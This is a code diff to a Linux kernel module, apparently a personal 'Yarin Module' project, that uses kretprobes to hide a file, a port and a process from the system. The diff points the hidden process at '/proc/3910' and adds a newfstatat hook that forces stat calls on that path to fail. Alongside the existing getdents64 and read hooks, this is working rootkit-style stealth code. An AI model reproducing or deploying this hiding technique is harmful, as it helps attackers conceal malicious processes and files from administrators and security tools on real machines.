@@ -16,7 +16,7 @@
 /// const file name to hide
 const char* hide_file_name = "hideme";
 const int port_to_hide = 8000;
-const char* pid_to_hide = "3456";
+const char* pid_to_hide = "/proc/3910";
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -178,6 +178,47 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
     return 0;
 }
 
+struct newfstatat_arguments {
+    unsigned int fd;
+    char* pathname;
+    void* result_ptr;
+};
+
+static int newfstatat_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+    struct newfstatat_arguments* args;
+    // syscall wrappers __x64_sys_* gets only ptr to regs
+    regs = ((struct pt_regs*)regs->di);
+
+    if (!current->mm)
+        return 1;	/* Skip kernel threads */
+
+
+    args = (struct newfstatat_arguments*)ri->data;
+
+//    //unsigned long syscall = regs->orig_ax;
+    args->fd = regs->di; // 0
+    args->pathname = (char*)regs->si; // 1
+    args->result_ptr = (void*)regs->dx; // 2
+
+    return 0;
+}
+
+static int newfstatat_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+    struct newfstatat_arguments* args = (struct newfstatat_arguments*) ri->data;
+    unsigned long result = regs_return_value(regs);
+
+    if(strcmp(args->pathname, pid_to_hide) == 0){
+        pr_info("HIDE -> newfstatat(%s) = %ld\n", args->pathname, result);
+        regs_set_return_value(regs, -1);
+        return 0;
+    }
+
+    return 0;
+}
+
+
 
 static struct kretprobe getdents64_kret_probe = {
         .maxactive = 20,
@@ -195,10 +236,18 @@ static struct kretprobe read_kret_probe = {
         .data_size = sizeof(struct read_arguments),
 };
 
+static struct kretprobe newfstatat_kret_probe = {
+    .maxactive = 20,
+    .entry_handler = newfstatat_handle_entry,
+    .handler = newfstatat_handle_return,
+    .kp.symbol_name = "__x64_sys_newfstatat",
+    .data_size = sizeof(struct newfstatat_arguments),
+};
+
 
 static int __init entrypoint(void)
 {
-    if (register_kretprobe(&getdents64_kret_probe) < 0 || register_kretprobe(&read_kret_probe) < 0) {
+    if (register_kretprobe(&getdents64_kret_probe) < 0 || register_kretprobe(&read_kret_probe) < 0 || register_kretprobe(&newfstatat_kret_probe) < 0) {
         pr_info("register_kretprobe  failed\n");
         return -1;
     }
@@ -213,8 +262,14 @@ static void __exit cleanup(void){
     pr_info("read_kret_probe Missed probing %d instances of %s\n",
             read_kret_probe.nmissed, read_kret_probe.kp.symbol_name);
 
+    pr_info("newfstatat_kret_probe Missed probing %d instances of %s\n",
+        newfstatat_kret_probe.nmissed, newfstatat_kret_probe.kp.symbol_name);
+    
+    
     unregister_kretprobe(&getdents64_kret_probe);
     unregister_kretprobe(&read_kret_probe);
+    unregister_kretprobe(&newfstatat_kret_probe);
+
     pr_info("Yarin Module cleanup\n");
 }
 
